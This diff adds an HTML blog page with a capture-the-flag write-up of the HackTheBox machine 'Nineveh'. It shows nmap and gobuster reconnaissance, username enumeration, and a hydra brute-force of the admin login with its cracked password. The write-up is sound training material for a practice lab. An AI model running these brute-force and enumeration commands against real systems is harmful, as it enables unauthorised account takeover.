@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Nineveh | Initial nmap root@Kali:~# nmap -sV -sC 10.10.10.43 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 10:51 GMT Nmap scan report for...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.12.3/jquery.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Nineveh</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation">
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="https://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (12)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (14)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-01-04 09:56:00+00:00">Sat 04 January 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Nineveh.html">Nineveh</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Nineveh.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <h1>Initial nmap</h1>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="mf">10.10.10.43</span><span class="w">                                                                                                                                                         </span>
+<span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mf">7.80</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">04</span><span class="w"> </span><span class="mi">10</span><span class="err">:</span><span class="mi">51</span><span class="w"> </span><span class="n">GMT</span><span class="w">                                                                                                                               </span>
+<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mf">10.10.10.43</span><span class="w">                                                                                                                                                              </span>
+<span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.096</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w">                                                                                                                                                                  </span>
+<span class="ow">Not</span><span class="w"> </span><span class="nl">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">998</span><span class="w"> </span><span class="n">filtered</span><span class="w"> </span><span class="n">ports</span><span class="w">                                                                                                                                                                 </span>
+<span class="n">PORT</span><span class="w">    </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w">  </span><span class="n">VERSION</span><span class="w">                                                                                                                                                                </span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">     </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mf">2.4.18</span><span class="w"> </span><span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span><span class="w">                                                                                                                                         </span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="nl">header</span><span class="p">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.18</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span><span class="w">                                                                                                                                                  </span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="nl">title</span><span class="p">:</span><span class="w"> </span><span class="n">Site</span><span class="w"> </span><span class="n">doesn</span><span class="s1">&#39;t have a title (text/html).                                                                                                                                          </span>
+<span class="s1">443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))                                                                                                                                         </span>
+<span class="s1">|_http-server-header: Apache/2.4.18 (Ubuntu)                                                                                                                                                  </span>
+<span class="s1">|_http-title: Site doesn&#39;</span><span class="n">t</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">title</span><span class="w"> </span><span class="p">(</span><span class="nc">text</span><span class="o">/</span><span class="n">html</span><span class="p">).</span><span class="w">                                                                                                                                          </span>
+<span class="o">|</span><span class="w"> </span><span class="n">ssl</span><span class="o">-</span><span class="nl">cert</span><span class="p">:</span><span class="w"> </span><span class="nl">Subject</span><span class="p">:</span><span class="w"> </span><span class="n">commonName</span><span class="o">=</span><span class="n">nineveh</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="n">organizationName</span><span class="o">=</span><span class="n">HackTheBox</span><span class="w"> </span><span class="n">Ltd</span><span class="o">/</span><span class="n">stateOrProvinceName</span><span class="o">=</span><span class="n">Athens</span><span class="o">/</span><span class="n">countryName</span><span class="o">=</span><span class="n">GR</span><span class="w">                                                                         </span>
+<span class="o">|</span><span class="w"> </span><span class="ow">Not</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="k">before</span><span class="err">:</span><span class="w"> </span><span class="mi">2017</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">01</span><span class="nl">T15</span><span class="p">:</span><span class="mi">03</span><span class="err">:</span><span class="mi">30</span><span class="w">                                                                                                                                                       </span>
+<span class="o">|</span><span class="n">_Not</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="k">after</span><span class="err">:</span><span class="w">  </span><span class="mi">2018</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">01</span><span class="nl">T15</span><span class="p">:</span><span class="mi">03</span><span class="err">:</span><span class="mi">30</span><span class="w">                                                                                                                                                       </span>
+<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="nc">date</span><span class="err">:</span><span class="w"> </span><span class="n">TLS</span><span class="w"> </span><span class="n">randomness</span><span class="w"> </span><span class="n">does</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">represent</span><span class="w"> </span><span class="nc">time</span><span class="w">                                                                                                                                            </span>
+<span class="o">|</span><span class="w"> </span><span class="n">tls</span><span class="o">-</span><span class="nl">alpn</span><span class="p">:</span><span class="w">                                                                                                                                                                                   </span>
+<span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="n">http</span><span class="o">/</span><span class="mf">1.1</span><span class="w">                                                                                                                                                                                  </span>
+
+<span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w">                                                                                                </span>
+<span class="n">Nmap</span><span class="w"> </span><span class="nl">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="n">up</span><span class="p">)</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">27.93</span><span class="w"> </span><span class="n">seconds</span><span class="w">                                 </span>
+</pre></div>
+
+
+<p>the nmap reveals two webservers, one on port 80 and one on port 443. The ssl-cert mentions a common name, <strong>nineveh.htb</strong> so I add an entry to my /et/hosts file and I browse the two webservers.</p>
+<p>http://ninevsh.htb gives this page:</p>
+<p><img alt="" src="../images/ninevesh-itworks.png"></p>
+<p>https://ninevsh.htb gives this page</p>
+<p><img alt="" src="../images/nineveh-https.png"></p>
+<p>I looked at the html source of both pages and there is nothing useful there. So I decided to scan for directories: </p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# gobuster dir --url http://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100                                                                    </span>
+<span class="err">===============================================================                                                                                                                               </span>
+<span class="err">Gobuster v3.0.1                                                                                                                                                                               </span>
+<span class="err">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)                                                                                                                               </span>
+<span class="err">===============================================================                                                                                                                               </span>
+<span class="err">[+] Url:            http://nineveh.htb                                                                                                                                                        </span>
+<span class="err">[+] Threads:        100                                                                                                                                                                       </span>
+<span class="err">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                                                              </span>
+<span class="err">[+] Status codes:   200,204,301,302,307,401,403                                                                                                                                               </span>
+<span class="err">[+] User Agent:     gobuster/3.0.1                                                                                                                                                            </span>
+<span class="err">[+] Timeout:        10s                                                                                                                                                                       </span>
+<span class="err">===============================================================                                                                                                                               </span>
+<span class="err">2020/01/04 11:19:28 Starting gobuster                                                                                                                                                         </span>
+<span class="err">===============================================================                                                                                                                               </span>
+<span class="err">/department (Status: 301)                                                                                                                                                                     </span>
+<span class="err">/server-status (Status: 403)                                                                                                                                                                  </span>
+<span class="err">===============================================================                                                                                                                               </span>
+<span class="err">2020/01/04 11:24:39 Finished                                                                                                                                                                  </span>
+<span class="err">=============================================================== </span>
+</pre></div>
+
+
+<p>I get only one result, the <strong>department</strong> directory, and when I checked I found a login page:</p>
+<p><img alt="" src="../images/nineveh-login.png"></p>
+<p>and looking at the source for this page I get this:</p>
+<p><img alt="" src="../images/nineveh-login-source.png"></p>
+<p>the interesting bit in there is the comment in green that says that MySQL has been installed but the page must be fixed!</p>
+<p>I was expecting some kind of sql injection. I tried all the combinations in this <a href="https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/">cheat sheet</a> but got nowhere. I also tried with sqlmap just in case but found nothing. So looks like there are no SQL injection vulnerabilities.</p>
+<p>Then i noticed something by trying guessing names. I tried the user <strong>nineveh</strong> and noticed this error:</p>
+<p><img alt="" src="../images/nineveh-invalid-user.png"></p>
+<p>Instead when I tried the user <strong>admin</strong> I get a different error:</p>
+<p><img alt="" src="../images/nineveh-invalid-password.png"></p>
+<p>This is an indication that <strong>admin</strong> could be a valid user. With that in mind we can try to perfom a brute force attack.</p>
+<p>First I launch burpsuite and I capture the request when I submit username and password, then I launch hydra:</p>
+<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/department/login.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">10.10.10.43</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">32</span>
+<span class="na">DNT</span><span class="o">:</span> <span class="l">1</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://10.10.10.43/department/login.php</span>
+<span class="na">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=pbv0s4021i456d0feorsps7u26</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+
+username=admin&amp;password=password
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">hydra</span><span class="w"> </span><span class="n">nineveh</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">post</span><span class="w"> </span><span class="ss">&quot;/department/login.php:username=^USER^&amp;password=^PASS^:Invalid Password!&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="mi">64</span><span class="w"> </span><span class="o">-</span><span class="n">V</span><span class="w">                 </span>
+<span class="n">Hydra</span><span class="w"> </span><span class="n">v9</span><span class="mf">.0</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2019</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">van</span><span class="w"> </span><span class="n">Hauser</span><span class="o">/</span><span class="n">THC</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">military</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">secret</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">organizations</span><span class="p">,</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">illegal</span><span class="w"> </span><span class="n">purposes</span><span class="p">.</span><span class="w">                                                               </span>
+
+<span class="n">Hydra</span><span class="w"> </span><span class="p">(</span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">vanhauser</span><span class="o">-</span><span class="n">thc</span><span class="o">/</span><span class="n">thc</span><span class="o">-</span><span class="n">hydra</span><span class="p">)</span><span class="w"> </span><span class="n">starting</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">05</span><span class="w"> </span><span class="mi">16</span><span class="err">:</span><span class="mi">56</span><span class="err">:</span><span class="mi">54</span><span class="w">                                                                                                            </span>
+<span class="o">[</span><span class="n">WARNING</span><span class="o">]</span><span class="w"> </span><span class="n">Restorefile</span><span class="w"> </span><span class="p">(</span><span class="n">you</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="n">seconds</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">abort</span><span class="p">...</span><span class="w"> </span><span class="p">(</span><span class="k">use</span><span class="w"> </span><span class="k">option</span><span class="w"> </span><span class="o">-</span><span class="n">I</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">skip</span><span class="w"> </span><span class="n">waiting</span><span class="p">))</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">previous</span><span class="w"> </span><span class="k">session</span><span class="w"> </span><span class="k">found</span><span class="p">,</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">prevent</span><span class="w"> </span><span class="n">overwriting</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">hydra</span><span class="p">.</span><span class="k">restore</span><span class="w">                                </span>
+<span class="o">[</span><span class="n">DATA</span><span class="o">]</span><span class="w"> </span><span class="nf">max</span><span class="w"> </span><span class="mi">64</span><span class="w"> </span><span class="n">tasks</span><span class="w"> </span><span class="n">per</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">server</span><span class="p">,</span><span class="w"> </span><span class="n">overall</span><span class="w"> </span><span class="mi">64</span><span class="w"> </span><span class="n">tasks</span><span class="p">,</span><span class="w"> </span><span class="mi">14344399</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="n">tries</span><span class="w"> </span><span class="p">(</span><span class="nl">l</span><span class="p">:</span><span class="mi">1</span><span class="o">/</span><span class="nl">p</span><span class="p">:</span><span class="mi">14344399</span><span class="p">),</span><span class="w"> </span><span class="o">~</span><span class="mi">224132</span><span class="w"> </span><span class="n">tries</span><span class="w"> </span><span class="n">per</span><span class="w"> </span><span class="n">task</span><span class="w">                                                                             </span>
+<span class="o">[</span><span class="n">DATA</span><span class="o">]</span><span class="w"> </span><span class="n">attacking</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">post</span><span class="o">-</span><span class="nl">form</span><span class="p">:</span><span class="o">//</span><span class="n">nineveh</span><span class="p">.</span><span class="nl">htb</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="n">department</span><span class="o">/</span><span class="n">login</span><span class="p">.</span><span class="nl">php</span><span class="p">:</span><span class="n">username</span><span class="o">=^</span><span class="k">USER</span><span class="o">^&amp;</span><span class="n">password</span><span class="o">=^</span><span class="n">PASS</span><span class="o">^</span><span class="err">:</span><span class="n">Invalid</span><span class="w"> </span><span class="n">Password</span><span class="err">!</span><span class="w">                                                                       </span>
+<span class="o">[</span><span class="n">ATTEMPT</span><span class="o">]</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">nineveh</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="ss">&quot;admin&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">pass</span><span class="w"> </span><span class="ss">&quot;123456&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">14344399</span><span class="w"> </span><span class="o">[</span><span class="n">child 0</span><span class="o">]</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span><span class="w">                                                                                                  </span>
+<span class="o">[</span><span class="n">ATTEMPT</span><span class="o">]</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">nineveh</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="ss">&quot;admin&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">pass</span><span class="w"> </span><span class="ss">&quot;12345&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">14344399</span><span class="w"> </span><span class="o">[</span><span class="n">child 1</span><span class="o">]</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span><span class="w">                                                                                                   </span>
+<span class="o">[</span><span class="n">ATTEMPT</span><span class="o">]</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">nineveh</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="ss">&quot;admin&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">pass</span><span class="w"> </span><span class="ss">&quot;123456789&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">14344399</span><span class="w"> </span><span class="o">[</span><span class="n">child 2</span><span class="o">]</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
+<span class="p">.</span><span class="w"></span>
+<span class="p">.</span><span class="w"></span>
+<span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span>
+<span class="p">.</span><span class="w"></span>
+<span class="p">.</span><span class="w"></span>
+<span class="o">[</span><span class="n">ATTEMPT</span><span class="o">]</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">nineveh</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="ss">&quot;admin&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">pass</span><span class="w"> </span><span class="ss">&quot;escorpio&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">4638</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">14344399</span><span class="w"> </span><span class="o">[</span><span class="n">child 54</span><span class="o">]</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
+<span class="o">[</span><span class="n">ATTEMPT</span><span class="o">]</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">nineveh</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="ss">&quot;admin&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">pass</span><span class="w"> </span><span class="ss">&quot;elvis1&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">4639</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">14344399</span><span class="w"> </span><span class="o">[</span><span class="n">child 23</span><span class="o">]</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
+<span class="o">[</span><span class="n">ATTEMPT</span><span class="o">]</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">nineveh</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="ss">&quot;admin&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">pass</span><span class="w"> </span><span class="ss">&quot;einstein&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">4640</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">14344399</span><span class="w"> </span><span class="o">[</span><span class="n">child 34</span><span class="o">]</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
+<span class="o">[</span><span class="n">ATTEMPT</span><span class="o">]</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">nineveh</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="ss">&quot;admin&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">pass</span><span class="w"> </span><span class="ss">&quot;carola&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">4641</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">14344399</span><span class="w"> </span><span class="o">[</span><span class="n">child 43</span><span class="o">]</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
+<span class="o">[</span><span class="n">ATTEMPT</span><span class="o">]</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">nineveh</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="ss">&quot;admin&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">pass</span><span class="w"> </span><span class="ss">&quot;benjamin1&quot;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">4642</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">14344399</span><span class="w"> </span><span class="o">[</span><span class="n">child 9</span><span class="o">]</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
+<span class="o">[</span><span class="n">80</span><span class="o">][</span><span class="n">http-post-form</span><span class="o">]</span><span class="w"> </span><span class="k">host</span><span class="err">:</span><span class="w"> </span><span class="n">nineveh</span><span class="p">.</span><span class="n">htb</span><span class="w">   </span><span class="nl">login</span><span class="p">:</span><span class="w"> </span><span class="k">admin</span><span class="w">   </span><span class="nl">password</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="n">q2w3e4r5t</span><span class="w"></span>
+<span class="mi">1</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">successfully</span><span class="w"> </span><span class="n">completed</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">found</span><span class="w"></span>
+<span class="o">[</span><span class="n">WARNING</span><span class="o">]</span><span class="w"> </span><span class="n">Writing</span><span class="w"> </span><span class="k">restore</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">because</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">final</span><span class="w"> </span><span class="n">worker</span><span class="w"> </span><span class="n">threads</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">complete</span><span class="w"> </span><span class="n">until</span><span class="w"> </span><span class="k">end</span><span class="p">.</span><span class="w"></span>
+<span class="o">[</span><span class="n">ERROR</span><span class="o">]</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">resolve</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">could</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">connected</span><span class="w"></span>
+<span class="o">[</span><span class="n">ERROR</span><span class="o">]</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="n">targets</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">complete</span><span class="w"></span>
